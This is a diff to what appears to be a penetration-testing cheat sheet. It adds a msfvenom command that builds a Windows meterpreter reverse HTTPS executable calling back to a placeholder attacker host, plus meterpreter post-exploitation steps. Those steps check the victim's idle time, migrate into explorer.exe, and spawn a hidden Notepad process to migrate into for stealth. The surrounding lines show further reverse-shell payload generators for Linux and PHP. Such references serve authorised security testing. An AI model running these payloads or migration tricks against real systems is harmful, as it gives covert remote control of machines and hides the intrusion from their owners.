@@ -891,6 +891,11 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf -o r
 msfvenom -p php/reverse_php LHOST=attacker.ip LPORT=443 -f raw > shell.pHP
 ~~~
 
+## ReverseShell(HTTPS)
+~~~ bash
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=attacker.ip LPORT=443 -f exe -o met.exe
+~~~
+
 
 # Searchsploit
 
@@ -1833,3 +1838,31 @@ msf6 > search multi/handler
 msf6 > use exploit/multi/handler
 ~~~
 
+
+## Display idle time from current user
+
+~~~ bash
+meterpreter > idletime
+User has been idle for: 9 mins 53 secs
+~~~
+
+
+## Migrate to explorer.exe
+
+~~~ bash
+meterpreter > migrate 8052
+~~~
+
+## Migrate to a newly spawned Notepad process
+
+~~~ bash
+meterpreter > execute -H -f notepad
+Process 2720 created.
+
+meterpreter > migrate 2720
+[*] Migrating from 8052 to 2720...
+[*] Migration completed successfully.
+
+meterpreter > 
+~~~
+`-H` : the Notepad process was spawned without any visual representation
